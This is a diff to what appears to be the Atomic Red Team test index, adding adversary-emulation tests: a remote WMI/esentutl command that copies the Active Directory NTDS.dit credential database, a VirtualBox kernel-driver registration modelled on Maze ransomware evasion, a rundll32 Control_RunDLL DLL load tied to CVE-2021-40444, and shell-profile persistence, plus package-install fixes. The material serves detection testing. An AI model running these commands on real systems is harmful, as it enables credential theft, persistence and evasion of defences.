@@ -4404,6 +4404,45 @@ credential-access:
 '
         name: command_prompt
         elevation_required: true
+    - name: Create Volume Shadow Copy remotely (WMI) with esentutl
+      auto_generated_guid: 21c7bf80-3e8b-40fa-8f9d-f5b194ff2865
+      description: |
+        This test is intended to be run from a remote workstation with domain admin context.
+        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.
+      supported_platforms:
+      - windows
+      input_arguments:
+        source_path:
+          description: File to shadow copy
+          type: String
+          default: c:\windows\ntds\ntds.dit
+        target_path:
+          description: Target path of the result file
+          type: String
+          default: c:\ntds.dit
+        target_host:
+          description: IP Address / Hostname you want to target
+          type: String
+          default: localhost
+      dependencies:
+      - description: 'Target must be a reachable Domain Controller, and current context
+          must be domain admin
+
+'
+        prereq_command: 'wmic /node:"#{target_host}" shadowcopy list brief
+
+'
+        get_prereq_command: 'echo Sorry, can''t connect to target host, check: network,
+          firewall or permissions (must be admin on target)
+
+'
+      executor:
+        command: 'wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe
+          /y /vss #{source_path} /d #{target_path}"
+
+'
+        name: command_prompt
+        elevation_required: true
     - name: Create Volume Shadow Copy with Powershell
       auto_generated_guid: 542bb97e-da53-436b-8e43-e0a7d31a6c24
       description: |
@@ -4570,7 +4609,7 @@ credential-access:
           -v tshark)" ]; then exit 1; else exit 0; fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release tcpdump tshark)||(which
+        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
       executor:
         command: |
@@ -4600,7 +4639,7 @@ credential-access:
           -v tshark)" ]; then exit 1; else exit 0; fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release tcpdump tshark)||(which
+        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
       executor:
         command: "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v
@@ -7852,7 +7891,7 @@ collection:
 
 '
         get_prereq_command: |
-          (which yum && yum -y epel-release zip)||(which apt-get && apt-get install -y zip)
+          (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)
           echo Please set input_files argument to include files that exist
       executor:
         name: sh
@@ -7958,8 +7997,8 @@ collection:
           ]; then exit 1; fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release zip gpg)||(which apt-get
-          && apt-get install -y zip gpg)\n"
+        get_prereq_command: "(which yum && yum -y install epel-release zip gpg)||(which
+          apt-get && apt-get install -y zip gpg)\n"
       executor:
         name: sh
         elevation_required: false
@@ -20081,9 +20120,12 @@ privilege-escalation:
         command_to_add:
           description: Command to add to the .bash_profile file
           type: String
-          default: "/path/to/script.py"
+          default: echo "Hello from Atomic Red Team T1546.004"
       executor:
-        command: 'echo "#{command_to_add}" >> ~/.bash_profile
+        command: 'echo ''#{command_to_add}'' >> ~/.bash_profile
+
+'
+        cleanup_command: 'sed -i ''/#{command_to_add}/d'' ~/.bash_profile
 
 '
         name: sh
@@ -20099,9 +20141,12 @@ privilege-escalation:
         command_to_add:
           description: Command to add to the .bashrc file
           type: String
-          default: "/path/to/script.py"
+          default: echo "Hello from Atomic Red Team T1546.004"
       executor:
-        command: 'echo "#{command_to_add}" >> ~/.bashrc
+        command: 'echo ''#{command_to_add}'' >> ~/.bashrc
+
+'
+        cleanup_command: 'sed -i ''/#{command_to_add}/d'' ~/.bashrc
 
 '
         name: sh
@@ -25637,8 +25682,8 @@ defense-evasion:
         package_installer:
           description: Package installer command for linux. Default yum
           type: String
-          default: "(which yum && yum -y epel-release rsyslog)||(which apt-get &&
-            apt-get install -y rsyslog)"
+          default: "(which yum && yum -y install epel-release rsyslog)||(which apt-get
+            && apt-get install -y rsyslog)"
         flavor_command:
           description: Command to disable syslog collection. Default newer rsyslog
             commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog
@@ -36165,7 +36210,65 @@ defense-evasion:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1564.006
+    atomic_tests:
+    - name: Register Portable Virtualbox
+      auto_generated_guid: c59f246a-34f8-4e4d-9276-c295ef9ba0dd
+      description: "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_file_path:
+          description: Path to the MSI file
+          type: Path
+          default: PathToAtomicsFolder\T1564.006\bin\Virtualbox_52.msi
+        cab_file_path:
+          description: Path to the CAB file
+          type: Path
+          default: PathToAtomicsFolder\T1564.006\bin\common.cab
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'MSI file must exist on disk at specified location (#{msi_file_path})
+
+'
+        prereq_command: 'if (Test-Path #{msi_file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{msi_file_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1564.006/bin/Virtualbox_52.msi" -OutFile "#{msi_file_path}"
+      - description: 'CAB file must exist on disk at specified location (#{cab_file_path})
+
+'
+        prereq_command: 'if (Test-Path #{cab_file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: "New-Item -Type Directory (split-path #{cab_file_path})
+          -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1564.006/bin/common.cab\"
+          -OutFile \"#{cab_file_path}\" \n"
+      - description: 'Old version of Virtualbox must be installed
+
+'
+        prereq_command: 'if (Test-Path "C:\Program Files\Oracle\VirtualBox\VboxC.dll")
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'msiexec /i #{msi_file_path} /qn
+
+'
+      executor:
+        command: |
+          "C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe" /reregserver
+          regsvr32 /S "C:\Program Files\Oracle\VirtualBox\VboxC.dll"
+          rundll32 "C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init"
+          sc create VBoxDRV binpath= "C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys" type= kernel start= auto error= normal displayname= PortableVBoxDRV
+          sc start VBoxDRV
+        cleanup_command: |
+          sc stop VBoxDRV
+          sc delete VBoxDRV
+          regsvr32 /u /S "C:\Program Files\Oracle\VirtualBox\VboxC.dll"
+          msiexec /x #{msi_file_path} /qn
+        name: command_prompt
   T1218.011:
     technique:
       id: attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5
@@ -36469,7 +36572,40 @@ defense-evasion:
 '
       executor:
         name: command_prompt
-        command: 'rundll32.exe #{input_file},#2'
+        command: 'rundll32.exe #{input_file},#2
+
+'
+    - name: Rundll32 with Control_RunDLL
+      auto_generated_guid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
+      description: "Rundll32.exe loading dll with 'control_rundll' within the command-line,
+        loading a .cpl or another file type related to CVE-2021-40444. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_url:
+          description: Url to download the DLL
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+        input_file:
+          description: DLL File
+          type: String
+          default: PathToAtomicsFolder\T1047\bin\calc.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'DLL file must exist on disk at specified location
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+
+'
+      executor:
+        name: command_prompt
+        command: 'rundll32.exe shell32.dll,Control_RunDLL #{input_file}
+
+'
   T1134.005:
     technique:
       external_references:
@@ -50522,9 +50658,12 @@ persistence:
         command_to_add:
           description: Command to add to the .bash_profile file
           type: String
-          default: "/path/to/script.py"
+          default: echo "Hello from Atomic Red Team T1546.004"
       executor:
-        command: 'echo "#{command_to_add}" >> ~/.bash_profile
+        command: 'echo ''#{command_to_add}'' >> ~/.bash_profile
+
+'
+        cleanup_command: 'sed -i ''/#{command_to_add}/d'' ~/.bash_profile
 
 '
         name: sh
@@ -50540,9 +50679,12 @@ persistence:
         command_to_add:
           description: Command to add to the .bashrc file
           type: String
-          default: "/path/to/script.py"
+          default: echo "Hello from Atomic Red Team T1546.004"
       executor:
-        command: 'echo "#{command_to_add}" >> ~/.bashrc
+        command: 'echo ''#{command_to_add}'' >> ~/.bashrc
+
+'
+        cleanup_command: 'sed -i ''/#{command_to_add}/d'' ~/.bashrc
 
 '
         name: sh
@@ -51798,8 +51940,8 @@ impact:
         prereq_command: 'which_gpg=`which gpg`
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release gpg)||(which apt-get
-          && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n"
+        get_prereq_command: "(which yum && yum -y install epel-release gpg)||(which
+          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n"
       executor:
         name: bash
         elevation_required: false
@@ -51884,8 +52026,8 @@ impact:
           which_ccencrypt=`which ccencrypt`
           which_ccdecrypt=`which ccdecrypt`
           if [[ $USER == "root" ]]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi
-        get_prereq_command: "(which yum && yum -y epel-release ccrypt)||(which apt-get
-          && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n"
+        get_prereq_command: "(which yum && yum -y install epel-release ccrypt)||(which
+          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n"
       executor:
         name: bash
         elevation_required: false
@@ -55443,6 +55585,16 @@ discovery:
 
 '
         name: sh
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'check if lsof exists
+
+'
+        prereq_command: 'which lsof
+
+'
+        get_prereq_command: "(which yum && yum -y install lsof)||(which apt-get &&
+          DEBIAN_FRONTEND=noninteractive apt-get install -y lsof)\n"
     - name: Show if a user account has ever logged in remotely
       auto_generated_guid: 0f0b6a29-08c3-44ad-a30b-47fd996b2110
       description: 'Show if a user account has ever logged in remotely
@@ -55799,8 +55951,8 @@ discovery:
           fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release nmap)||(which apt-get
-          && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)\n"
+        get_prereq_command: "(which yum && yum -y install epel-release nmap)||(which
+          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)\n"
       executor:
         command: |
           nmap -sS #{network_range} -p #{port}
@@ -55957,8 +56109,8 @@ discovery:
         package_installer:
           description: Package installer command. Debian - apt install samba
           type: String
-          default: "(which yum && yum -y epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive
-            apt-get install -y samba)"
+          default: "(which yum && yum -y install epel-release samba)||(which apt-get
+            && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)"
       dependency_executor_name: bash
       dependencies:
       - description: 'Package with smbstatus (samba) must exist on device
@@ -56142,7 +56294,7 @@ discovery:
           -v tshark)" ]; then exit 1; else exit 0; fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release tcpdump tshark)||(which
+        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
       executor:
         command: |
@@ -56172,7 +56324,7 @@ discovery:
           -v tshark)" ]; then exit 1; else exit 0; fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release tcpdump tshark)||(which
+        get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
       executor:
         command: "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v
